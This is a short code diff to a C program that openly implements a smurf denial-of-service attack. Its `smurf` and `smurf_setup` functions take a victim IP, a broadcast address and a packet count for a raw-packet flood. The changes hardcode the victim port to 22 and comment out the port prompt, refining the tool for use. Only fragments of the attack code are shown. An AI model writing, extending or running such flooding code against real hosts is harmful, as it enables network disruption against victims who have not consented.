@@ -28,7 +28,7 @@ void smurf(char * victimIP, int victimPort, char * broadCastIp, int nPackets){
 	}
 	
 	//Datagram to represent the packet
-	unsigned char packet[40000] , source_ip[32] , *data , *pseudogram;
+	unsigned char packet[40000] , source_ip[32];
 	
 	
 	//zero out the packet buffer
@@ -109,7 +109,7 @@ void smurf_setup(){
 
 	char victimIp[32];
 	char broadCastIp[32];
-	int victimPort = 0;
+	int victimPort = 22;
 	int broadCast = 1;
 	int nPackets;
 
@@ -118,8 +118,8 @@ void smurf_setup(){
 	fgets(victimIp, 32, stdin);
 	victimIp[strcspn(victimIp, "\n")] = 0;
 
-	printf ("Enter victim's port : ");
-	scanf ("%d", &victimPort);
+	// printf ("Enter victim's port : ");
+	// scanf ("%d", &victimPort);
 
 	while ((getchar()) != '\n'); //clear out buffer
 	printf ("Enter broadcast address: ");
